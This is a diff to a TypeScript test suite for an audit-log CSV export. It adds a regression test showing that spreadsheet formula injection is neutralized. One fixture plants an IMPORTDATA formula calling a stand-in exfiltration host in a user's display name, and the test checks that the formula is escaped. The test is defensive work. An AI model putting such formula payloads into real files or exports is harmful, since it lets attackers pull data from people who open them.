@@ -21,6 +21,7 @@ import {
   type TestAuth,
 } from "../test/support";
 import { auditLogRoutes } from "./audit-log";
+import { parseCsv } from "./core/csv";
 
 const env = completeEnv();
 const COMPANY_ID = "8a1b3c5d-7e9f-4a2b-8c4d-6e8f0a2b4c6d";
@@ -161,9 +162,65 @@ describe("GET /v1/audit-log", () => {
     expect(header).toBe(
       "occurred_at,actor,actor_ip,action,target_type,target_id,before,after",
     );
-    // RFC 4180: a quote inside a name is doubled, never left to break the row.
-    expect(first).toContain('"Sam ""Doc"""');
-    expect(first).toContain('"member.deactivated"');
+    // The whole row, because the column ORDER is what the recipient's importer
+    // and every questionnaire template are pinned to. RFC 4180 via the shared
+    // serializer: a quote inside a name is doubled and the field wrapped, and a
+    // field with nothing to escape is emitted bare — which is why the action is
+    // not quoted here.
+    expect(first).toBe(
+      "2026-07-20T15:04:05+00:00," +
+        '"Sam ""Doc""",' +
+        "203.0.113.7," +
+        "member.deactivated," +
+        "member," +
+        "mmmmmmmm-0000-4000-8000-000000000001," +
+        '"{""role"":""member"",""active"":true}",' +
+        '"{""role"":""member"",""active"":false}"',
+    );
+  });
+
+  it("neutralizes a cell a spreadsheet would otherwise EXECUTE (#580)", async () => {
+    // Both reachable payloads in one row, and only the first needs an attacker.
+    // `actor` is `profiles.display_name`, which any member sets on themselves
+    // through PATCH /v1/me with no charset restriction; `target_id` is what
+    // messaging/opt-out.ts writes, an E.164 number, so it leads with "+" for
+    // every STOP this workspace has ever recorded.
+    const sb = stub([
+      row({
+        actor_name: '=IMPORTDATA("https://exfil.example/collect")',
+        target_id: "+14165550199",
+      }),
+    ]);
+    stubFetch(jwksRoute(auth), sb.route);
+
+    const res = await apiRequest(
+      app,
+      env,
+      await auth.token(),
+      "/v1/audit-log?format=csv",
+      { companyId: COMPANY_ID },
+    );
+    // Asserted before the body: a 500 would leave every assertion below throwing
+    // on `undefined`, which is a legible failure for the wrong reason.
+    expect(res.status).toBe(200);
+    const text = await res.text();
+    const [, first] = text.split("\r\n");
+
+    // The apostrophe is the whole fix: it makes the engine read the rest of the
+    // cell as text. RFC quoting alone did not merely fail to help — it PRESERVED
+    // the commas between the formula's arguments, so the payload arrived whole.
+    expect(first).toContain(
+      `"'=IMPORTDATA(""https://exfil.example/collect"")"`,
+    );
+    expect(first).not.toContain('"=IMPORTDATA');
+    expect(first).toContain(",'+14165550199,");
+
+    // Asserted across the whole row, not just the two cells this test aims at:
+    // the guard is per column, so a column added later must not be able to
+    // reopen the hole without failing here.
+    for (const cell of parseCsv(text)[1]) {
+      expect(/^[=+\-@\t\r\n]/.test(cell)).toBe(false);
+    }
   });
 
   it("names the system when nobody did it", async () => {
@@ -179,7 +236,9 @@ describe("GET /v1/audit-log", () => {
       "/v1/audit-log?format=csv",
       { companyId: COMPANY_ID },
     );
-    expect(await res.text()).toContain('"system"');
+    // Read as a CELL rather than as a substring: the shared serializer quotes
+    // only what needs quoting, so what this test is about is the value.
+    expect(parseCsv(await res.text())[1][1]).toBe("system");
   });
 
   it("is closed to ordinary members", async () => {
